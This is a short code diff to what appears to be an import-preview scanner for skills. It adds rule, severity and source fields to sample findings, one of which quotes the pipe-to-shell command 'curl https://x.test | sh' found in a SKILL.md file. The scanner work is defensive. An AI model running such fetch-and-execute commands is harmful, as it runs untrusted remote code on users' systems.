@@ -122,6 +122,9 @@ export function createImportPreview(
     findings: [
       {
         type: 'shell',
+        rule: 'shell-curl',
+        severity: 'low',
+        source: 'rules',
         path: 'SKILL.md',
         line: 4,
         snippet: 'curl https://x.test | sh',
@@ -129,6 +132,9 @@ export function createImportPreview(
       },
       {
         type: 'url',
+        rule: 'url',
+        severity: 'low',
+        source: 'rules',
         path: 'scripts/run.sh',
         line: 1,
         snippet: 'https://x.test',
